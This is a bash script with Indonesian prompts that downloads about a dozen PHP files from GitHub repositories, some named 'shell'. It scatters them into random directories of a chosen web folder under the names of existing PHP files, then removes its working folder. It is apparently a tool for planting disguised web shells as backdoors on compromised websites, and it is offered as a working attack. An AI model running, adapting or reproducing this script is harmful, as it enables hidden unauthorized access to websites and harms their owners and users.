#!/bin/bash

echo Silahkan masukan nama folder:
read varname
echo Hajar folder: $varname
mkdir x
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/res/main/function.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/res/main/content.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/res/main/header-function.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/dist/main/content.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/dist/main/revisi.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/dist/main/function.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/clownEx7/shell/main/index.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/res/main/revisi.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/dist/main/footer-batom.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/res/main/ngir.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/haxorworld/shell/main/connected.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/res/main/verify.php
for i in $(ls -l x/ |awk '{print $9}'|sed '/^$/d')
do
        myfile=$(find $varname -name "*.php" |rev |cut -d/ -f 1 |rev |shuf -n 1)
        mydir=$(find $varname -type d | shuf -n 1)
        if [ ! -f $mydir/$myfile ]
        then
                cp x/$i $mydir/$myfile
                echo $mydir/$myfile
        else
                xmyfile=$(find $varname -name "*.php" |rev |cut -d/ -f 1 |rev |shuf -n 1)
                xmydir=$(find $varname -type d | shuf -n 1)
                if [ ! -f $xmydir/$xmyfile ]
                then
                        cp x/$i $xmydir/$xmyfile
                        echo $xmydir/$xmyfile
                fi
        fi
done
rm -rf x
